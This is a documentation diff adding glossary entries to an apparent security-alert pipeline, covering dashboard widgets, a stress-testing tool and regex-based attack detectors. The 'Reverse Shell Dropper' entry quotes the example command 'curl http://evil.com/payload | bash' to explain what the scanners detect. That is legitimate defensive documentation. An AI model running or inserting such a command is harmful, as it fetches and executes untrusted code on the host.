@@ -185,3 +185,23 @@ All verdicts are defined in: `worker/stages/assess.py` function `_derive_verdict
 **Semaphore** -- A concurrency limiter. Zovark uses Semaphore(2) for pipeline LLM calls (max 2 concurrent) and Semaphore(1) for copilot calls (max 1 concurrent). This prevents GPU memory exhaustion when multiple investigations arrive simultaneously. File: `worker/llm_client.py`.
 
 **Circuit Breaker** -- A failure detection pattern with three states. GREEN: everything works normally. YELLOW: some failures detected, reduced capacity. RED: too many failures, stop sending requests. When the LLM is down, the circuit breaker goes RED and investigations fail-closed (verdict = needs_manual_review, never benign). File: `worker/stages/circuit_breaker.py`.
+
+---
+
+## Dashboard Terms
+
+**Sidebar** -- The vertical navigation panel on the left side of the web-admin dashboard (port 3100). Groups pages into 4 collapsible sections: Operations, Intelligence, Analytics, Admin. Replaced the original flat tab bar. File: `web-admin/src/components/Sidebar.tsx`.
+
+**Alert Forge** -- A built-in stress testing tool. Operators configure how many synthetic alerts to generate (100-10,000), what percentage are attacks vs benign, and the injection rate. The Pipeline Monitor shows real-time results. Used for benchmarking and demos. File: `web-admin/src/components/AlertForge.tsx`.
+
+**Pipeline Monitor** -- A real-time dashboard widget showing investigation throughput, latency, verdict distribution, stage flow, and attack type breakdown. Updates every 3-10 seconds via polling. Embedded in Alert Forge and available as a standalone page. File: `web-admin/src/components/PipelineMonitor.tsx`.
+
+---
+
+## Security Terms (Session Additions)
+
+**Reverse Shell Dropper** -- A pattern where an attacker uses `curl http://evil.com/payload | bash` or `wget ... | bash` to download and execute a malicious script in one command. The content scanner (70 patterns) and signal boost (11 patterns) both detect this. Files: `worker/stages/ingest.py`, `worker/stages/assess.py`.
+
+**Content Scanner** -- The 70-pattern regex engine in the Ingest stage that scans raw_log for high-confidence attack indicators. If attack content is found, the alert is forced into investigation even if metadata says "benign." Includes caret deobfuscation for CMD escapes. File: `worker/stages/ingest.py:RAW_LOG_ATTACK_PATTERNS`.
+
+**Signal Boost** -- The 11-pattern regex engine in the Assess stage that scans SIEM data (raw_log + title + rule_name) for obvious attack signatures (SQLi, XSS, path traversal, C2 beaconing, reverse shell droppers). Each match adds +45 to the risk score. File: `worker/stages/assess.py:attack_signals`.
